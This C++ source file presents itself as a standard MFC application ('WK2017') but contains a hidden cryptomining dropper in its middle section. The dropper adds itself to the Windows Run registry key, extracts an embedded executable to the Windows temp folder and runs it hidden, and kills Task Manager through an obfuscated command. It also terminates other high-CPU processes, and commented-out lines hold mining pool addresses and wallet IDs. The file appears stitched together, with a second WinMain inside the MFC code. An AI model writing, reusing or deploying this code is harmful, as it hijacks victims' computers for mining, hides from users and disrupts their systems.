// WK2017.cpp : Defines the class behaviors for the application.
//

#include "stdafx.h"
#include "WK2017.h"

#include "MainFrm.h"
#include "WK2017Doc.h"
#include "WK2017View.h"

#include "CPUusage.h"
#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

/////////////////////////////////////////////////////////////////////////////
// CWK2017App

BEGIN_MESSAGE_MAP(CWK2017App, CWinApp)
	//{{AFX_MSG_MAP(CWK2017App)
	ON_COMMAND(ID_APP_ABOUT, OnAppAbout)
		// NOTE - the ClassWizard will add and remove mapping macros here.
		//    DO NOT EDIT what you see in these blocks of generated code!
	//}}AFX_MSG_MAP
	// Standard file based document commands
	ON_COMMAND(ID_FILE_NEW, CWinApp::OnFileNew)
	ON_COMMAND(ID_FILE_OPEN, CWinApp::OnFileOpen)
	// Standard print setup command
	ON_COMMAND(ID_FILE_PRINT_SETUP, CWinApp::OnFilePrintSetup)
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CWK2017App construction

CWK2017App::CWK2017App()
{
	// TODO: add construction code here,
	// Place all significant initialization in InitInstance
}

/////////////////////////////////////////////////////////////////////////////
// The one and only CWK2017App object

CWK2017App theApp;

/////////////////////////////////////////////////////////////////////////////
// CWK2017App initialization

#include "stdafx.h"
//#include "WkRat.h"
#include <shellapi.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <iostream>
#include <iomanip>
#include <winbase.h>
#include <windows.h>
#include <Tlhelp32.h>
#include <string.h>
#pragma comment(linker, "/opt:nowin98") 
#pragma comment (lib, "user32.lib")
#pragma comment (lib, "ADVAPI32.lib")
#pragma comment (lib, "shell32.lib")
#pragma comment (lib, "kernel32.lib")
///////////////
struct FALLEN_DATA
{
	unsigned int finder;
	char xxs[1000];
	char filename[1000];
}
fallen_data =
{
	0xF9E28F8D,
	"xxs"
	"filename"	
};

/////////////////
BOOL IsExistProcess(CONST CHAR* szProcessName)  //进程判断
{  
    PROCESSENTRY32 processEntry32;   
    HANDLE toolHelp32Snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,  0);  
    if (((int)toolHelp32Snapshot) != -1)  
    {  
        processEntry32.dwSize = sizeof(processEntry32);  
        if (Process32First(toolHelp32Snapshot, &processEntry32))  
        {  
            do  
            {  
                if(strcmp(szProcessName ,processEntry32.szExeFile) == 0)  
                {  
                    return TRUE;  
                }  
            }while (Process32Next(toolHelp32Snapshot, &processEntry32));  
        }  
        CloseHandle(toolHelp32Snapshot);  
    }  
	
    return FALSE;  
}  



BOOL FreeResFile(DWORD dwResName, LPCSTR lpResType, LPCSTR lpFilePathName)
{
	HMODULE hInstance = ::GetModuleHandle(NULL);//得到自身实例句柄  
	// HINSTANCE hInstance=GetModuleHandle("AudioEngine.dll");//获得dll句柄
	HRSRC hResID = ::FindResourceA(hInstance, MAKEINTRESOURCE(dwResName), lpResType);//查找资源  
	HGLOBAL hRes = ::LoadResource(hInstance, hResID);//加载资源  
	LPVOID pRes = ::LockResource(hRes);//锁定资源  
	
	if (pRes == NULL)//锁定失败  
	{
		return FALSE;
	}
	DWORD dwResSize = ::SizeofResource(hInstance, hResID);//得到待释放资源文件大小  
	HANDLE hResFile = CreateFileA(lpFilePathName, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);//创建文件  
	
	if (INVALID_HANDLE_VALUE == hResFile)
	{
		//TRACE("创建文件失败！");  
		return FALSE;
	}
	
	DWORD dwWritten = 0;//写入文件的大小     
	WriteFile(hResFile, pRes, dwResSize, &dwWritten, NULL);//写入文件  
	CloseHandle(hResFile);//关闭文件句柄  
	
	return (dwResSize == dwWritten);//若写入大小等于文件大小，返回成功，否则失败  
	
}

void mining()
{
	
	 CHAR szRunPath[MAX_PATH];
	 ZeroMemory(szRunPath, MAX_PATH);
	 GetModuleFileNameA(NULL, szRunPath, MAX_PATH);
	 HKEY hkey;
	 RegOpenKeyExA(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", NULL, KEY_ALL_ACCESS | KEY_WOW64_64KEY, &hkey);
	 RegSetValueExA(hkey, "xxsdcyiyi", 0, REG_SZ, (const unsigned char*)(LPCTSTR)szRunPath, strlen(szRunPath));
	 RegCloseKey(hkey);//开机启用
	 CHAR szWindowsTempDri[MAX_PATH];
	 ZeroMemory(szWindowsTempDri, MAX_PATH);
	 GetWindowsDirectoryA(szWindowsTempDri, MAX_PATH);//GetWindowsDirectory是一个函数，用以获取Windows目录的完整路径名。即系统的windows目录
	 strcat(szWindowsTempDri, "//temp");
	 CHAR szFileName[MAX_PATH] = { 0 };
	 //char SAiGt[] = {' ','-','a',' ','c','r','y','p','t','o','n','i','g','h','t',' ','-','o',' ','s','t','r','a','t','u','m','+','t','c','p',':','/','/','k','r','b','.','m','i','n','e','r','.','r','o','c','k','s',':','3','3','3','3',' ','- ','u',' ','K','b','i','X','2','K','H','s','7','a','p','1','j','s','R','2','m','V','N','k','G','j','c','Y','p','j','c','n','A','E','r','9','y','3','Q','S','2','5','b','s','x','p','C','i','X','H','h','r','f','j','g','C','z','9','z','a','z','w','x','w','N','E','C','N','K','c','Q','h','B','P','s','S','P','p','t','z','E','5','U','8','a','K','W','1','M','Q','n','u','T','W','j','a','2','J','W',' ','-','p',' ','x',' ','-','-','d','o','n','a','t','e','-','l','e','v','e','l','=','1','\0'};
     // char SAiGt[] = { "  -o stratum+tcp://pool.minexmr.com:5555 -u 44c4syaMqg2BBd1ALNtAihD19dKoQX4qiCXCsZqxSWuv7zkZoAmwATSiMR7DVPRirD8Dnzd3ZiByQgchX2CheVcD4Hzh7ne -p x --donate-level=1 --max-cpu-usage=75 " };
	 wsprintfA(szFileName, "%s\\%s", szWindowsTempDri, fallen_data.filename);//连接
	 FreeResFile(IDR_EXE2, "EXE", szFileName);//释放文件	
	 Sleep(0x1F4);
	 ShellExecuteA(NULL, "open", szFileName, fallen_data.xxs, NULL, SW_HIDE);//代命令运行文件
	}

 DWORD Kid()
 {
	 PROCESSENTRY32 pe;
	 DWORD id = 0;
	 char* K_pid = "ntsd -c q -p ";
	 char* pid;
	 HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	 pe.dwSize = sizeof(PROCESSENTRY32);
	 if (!Process32First(hSnapshot, &pe))
		 return 0;
	 while (1)
	 {
		 pe.dwSize = sizeof(PROCESSENTRY32);
		 if (Process32Next(hSnapshot, &pe) == FALSE)
			 break;
		 id = pe.th32ProcessID;
		 CPUusage usg(id);
		 float  cpu;
		 float cpus = 30.00;
		 for (int i = 0; i < 10; i++)
		 {
			 cpu = usg.get_cpu_usage();
			 Sleep(50);
		 }
		 if (cpu > cpus)
		 {
			 if (strcmp(fallen_data.filename,pe.szExeFile) != 0)//看看是不是自己啦
			 {
				 HANDLE hProcessHandle;
				 hProcessHandle = ::OpenProcess(PROCESS_TERMINATE, FALSE, id);
				 return ::TerminateProcess(hProcessHandle, 4);
			 }
		 }
	 }
	 CloseHandle(hSnapshot);
	 return 0;
 }


	
 int APIENTRY WinMain(HINSTANCE hInstance,
	 HINSTANCE hPrevInstance,
	 LPSTR     lpCmdLine,
	 int       nCmdShow)
{	
	strcat(fallen_data.filename,".exe");
	char gPoMW[] = {'t','a','s','k','k','i','l','l',' ','/','f',' ','/','i','m',' ','T','a','s','k','m','g','r','.','e','x','e','\0'};
	WinExec(gPoMW,SW_HIDE);  //先关闭一波任务管理器进程
	mining();//开始挖矿嘿嘿嘿
/*	char VSFaC[] = "taskkill /f /im ";
	strcat(VSFaC,fallen_data.filename);*/
	while(1)
	{
		
		if (IsExistProcess(fallen_data.filename)==TRUE)//判断程序是否运行
		{		
			
			Kid();//杀死其他挖矿进程
			Sleep(600);
			
		}
		else//如果挖矿进程不存在了
		{
			
			Kid();//杀死其他挖矿进程
			mining();//开始挖矿
			Sleep(600);
			
		}
		
	}

	return 0;

}


/////////////////////////////////////////////////////////////////////////////
// CAboutDlg dialog used for App About

class CAboutDlg : public CDialog
{
public:
	CAboutDlg();

// Dialog Data
	//{{AFX_DATA(CAboutDlg)
	enum { IDD = IDD_ABOUTBOX };
	//}}AFX_DATA

	// ClassWizard generated virtual function overrides
	//{{AFX_VIRTUAL(CAboutDlg)
	protected:
	virtual void DoDataExchange(CDataExchange* pDX);    // DDX/DDV support
	//}}AFX_VIRTUAL

// Implementation
protected:
	//{{AFX_MSG(CAboutDlg)
		// No message handlers
	//}}AFX_MSG
	DECLARE_MESSAGE_MAP()
};

CAboutDlg::CAboutDlg() : CDialog(CAboutDlg::IDD)
{
	//{{AFX_DATA_INIT(CAboutDlg)
	//}}AFX_DATA_INIT
}

void CAboutDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CAboutDlg)
	//}}AFX_DATA_MAP
}

BEGIN_MESSAGE_MAP(CAboutDlg, CDialog)
	//{{AFX_MSG_MAP(CAboutDlg)
		// No message handlers
	//}}AFX_MSG_MAP
END_MESSAGE_MAP()

// App command to run the dialog
void CWK2017App::OnAppAbout()
{
	CAboutDlg aboutDlg;
	aboutDlg.DoModal();
}

/////////////////////////////////////////////////////////////////////////////
// CWK2017App message handlers

